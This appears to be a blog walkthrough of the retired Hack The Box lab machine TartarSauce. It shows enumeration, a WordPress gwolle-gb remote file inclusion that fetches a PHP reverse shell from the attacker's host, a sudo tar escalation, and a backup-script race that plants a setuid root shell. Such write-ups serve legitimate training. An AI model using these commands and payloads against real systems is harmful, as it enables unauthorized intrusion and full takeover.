---
layout: post
title: "HTB-TartarSauce"
categories: HTB-Walkthrough
---

![tartarsauce](/assets/img/tartarsauce/tartarsauce1.png)


TartarSauce is another OSCP-like box from the HTB 'retired' archive.

nmap first!


<h3>Nmap</h3>

```

nmap -sV -sC 10.10.10.88 |tee -a tar.txt

Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-10 06:06 EDT
Nmap scan report for 10.10.10.88
Host is up (0.17s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page

```



The nmap scan uses the `-sC` flag to run nmap's default nse scripts. It's returned the contents of `/robots.txt` which contains
a few interesting things to take a closer look at.



<hr width="250" size="6">



In firefox we are greeted by some nice ascii art.

![tartar](/assets/img/tartarsauce/tartar-web1.png)


Looking at `http://10.10.10.88/webservices/monstra-3.0.4/` we are taken to a website hosted by
`monstra 3.0.4`.

![monstra](/assets/img/tartarsauce/tartar-monstra1.png)


The links to this homepage don't seem to lead anywhere, so gobuster is set to browse the site's directories.

```
gobuster dir -u http://10.10.10.88/webservices/monstra-3.0.4/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,.txt,.xml
```

Gobuster returns some directories to check out.

```

/public (Status: 301)
/admin (Status: 301)
/storage (Status: 301)
/plugins (Status: 301)
/engine (Status: 301)
/libraries (Status: 301)
/robots.txt (Status: 200)
/tmp (Status: 301)
/boot (Status: 301)
/backups (Status: 301)

```

We check the new `robots.txt` first for interesting contents.

```
User-agent: *
Disallow: /admin/
Disallow: /engine/
Disallow: /libraries/
Disallow: /plugins/
```


`http://10.10.10.88/webservices/monstra-3.0.4/admin/` takes us to a login page.

![login](/assets/img/tartarsauce/tartar-monstra-login.png)


Searchsploit offers some results for `searchsploit monstra 3.0.4`

![searchsploit](/assets/img/tartarsauce/tartar-searchsploit-monstra.png)


None of these seem immediately helpful, so I research other possible exploits available online.

I find one that refers to [Unauthenticated User Credentials Exposure](https://simpleinfosec.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/)
and take a look.

It mentions a publicly exposed file located at `http://sitename.com/storage/database/users.table.xml`


Visiting the page `http://10.10.10.88/webservices/monstra-3.0.4/storage/database/users.table.xml` in the browser
confirms the vulnerability.

![users-xml](/assets/img/tartarsauce/tartar-users-xml.png)


I hit a bit of a stumbling block here, 

hash-identifier recognizes `5d1e3697d706b0e24e574b56e79affda` as MD5, or possibly MD4, but its going to take a bit of fiddling
to get john to successfully crack it, and crackstation is not able to crack it.

I resolve to come back to this if other avenues of investigation hit dead ends.


<hr width="250" size="6">


Looking back at the initial nmap results, I see that I homed-in on the /webservices/monstra-3.0.4/ directory first, 
so I return to check out the `/webservices` directory for other interesting contents.



```
gobuster dir -u http://10.10.10.88/webservices/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x .php,.txt
```

This finds `/wp`, a wordpress folder; definately worth a closer look.

I set gobuster to check out the other interesting lead `/tar/tar/source/` while I run `WP-Scan` on the wordpress folder.

```
gobuster dir -u http://10.10.10.88/webservices/tar/tar/source/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x .php,.txt
```


<h3>WPScan</h3>

```
wpscan --url http://10.10.10.88/webservices/wp/
```

The results were underwhelming, so I try again with a more agressive scan.

---
wpscan --url http://10.10.10.88/webservices/wp/ --enumerate ap --plugins-detection aggressive
---


```

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2019-11-13T20:46:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] brute-force-login-protection
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 | Latest Version: 1.5.3 (up to date)
 | Last Updated: 2017-06-29T10:39:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2020-03-08T11:10:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 3.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

<--snip-->

```

![gwolle](/assets/img/tartarsauce/tartar-gwolle.png)

`searchsploit -x 38861`

![gwolle-x](/assets/img/tartarsauce/tartar-searchsploit-gwolle-x.png)


<h3>Exploit</h3>

Get a copy of a php-reverse-shell.php (either from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) or /usr/share/webshells/php). Rename it `wp-load.php`, setting the ip and port accordingly.

Serve the file with a simple python web server.
`python3 -m http.server 80`

Set a netcat listener.
`nc -nlvp 6969`

Use the following url.

```
10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.17/
```


Catch the shell...make it better...

```
$ python -c 'import pty;pty.spawn("/bin/bash")'                                                                    
www-data@TartarSauce:/$                 
```



<h3>Privilege Escalation</h3>


`sudo -l` reveals that wwwdata can run /bin/tar as user `onuma`.

```
User www-data may run the following commands on TartarSauce:                                                       
    (onuma) NOPASSWD: /bin/tar     
```


[gtfobins](https://gtfobins.github.io/gtfobins/tar/) shows us how we can utilize this to escalate to onuma user.

```
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Now we can grab the user flag.
```
onuma@TartarSauce:~$ cat user.txt
cat user.txt
b2xxxxxxxxxxxxxxxxxxxxxxxxxxxxc7
```

We find `shadow_bkp` in onuma's home directory, owned by root, but with 777 privs. There maybe a backup
script running on a cronjob, pspy can help spot running processes.

`mkdir /var/tmp/boo` makes a working directory to use, use `wget` to put pspy32 into the target folder.

`wget http://10.10.14.17/pspy32`

make it executable: `chmod +x pspy32`

run it: `./pspy32`

![pspy32](/assets/img/tartarsauce/tartar-pspy32.png)

It appears that periodically, /usr/sbin/backuperer uses /bin/tar to compress /var/www/html

it then decompresses the file and checks it with /var/tmp/check

then saves it as /var/backups/onuma-www-dev.bak



We can check this by having a look at the script.

`cat /usr/sbin/backuperer`


```
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi

```



<hr width="250" size="6">

<h4>The Plan</h4>


Fool `$check` by creating the `$basedir` variable on Kali to house a setuid rootshell.
Wait for the script to 'sleep', then substitute the compressed archive with our own.
When the script processes the archive and creates the 'check' folder, we can access the setuid file and execute it...getting a root-shell.


<hr width="250" size="6">

First on Kali make a setuid.c file:


```
#include <stdio.h>

#include<stdlib.h>

#include<unistd.h>

int main ( int argc, char *argv[] )

{

setreuid(0,0);

execve("/bin/sh", NULL, NULL);

}

```

compile it:

```
gcc -m32 -o setuid setuid.c
```

then set its permissions:
`chmod 6555 setuid`


Next `mkdir -p var/www/html` this creates all the necessary folders.

`mv setuid var/www/html/`

Next make a tarball of the created path and file.

```
tar -zcvf evil.tar.gz var/
```

we get `evil.tar.gz`

use wget to copy it across to the target folder `/var/tmp`

#############


Then in /var/tmp repeatedly do `ls -la` until we see the hidden file with a long random name.

(we could script this and/or use `watch` but it's not too bothersome to do this manually)

Quickly copy the tarball to randomfile name (thus replacing it)

....wait approximately 30 secs for check folder to appear.

Then do:
`check/var/www/html/setuid` to execute setuid and get root shell....


```

$ ls -la
ls -la
total 44
drwxrwxrwt  9 root  root  4096 Jan 22 06:19 .
drwxr-xr-x 14 root  root  4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 2766 Jan 22 06:18 .cb5ac6f342da17bb06db854594565cdb5072b159
-rw-r--r--  1 onuma onuma 2766 Jan 22 06:13 evil.tar.gz
drwxr-xr-x  3 root  root  4096 Jan 22 06:19 check
drwx------  3 root  root  4096 Jan 21 14:57 systemd-private-00c6d6ebfcd040b6b2794a216b199497-systemd-timesyncd.service-VqUB7s
drwx------  3 root  root  4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root  4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
drwx------  3 root  root  4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
drwx------  3 root  root  4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
drwx------  3 root  root  4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
$ check/var/www/html/setuid
check/var/www/html/setuid
# id
id
uid=0(root) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
# cat /root/root.txt
cat /root/root.txt
#  e7xxxxxxxxxxxxxxxxxxxxxxxxxxf9
# 

```




:)



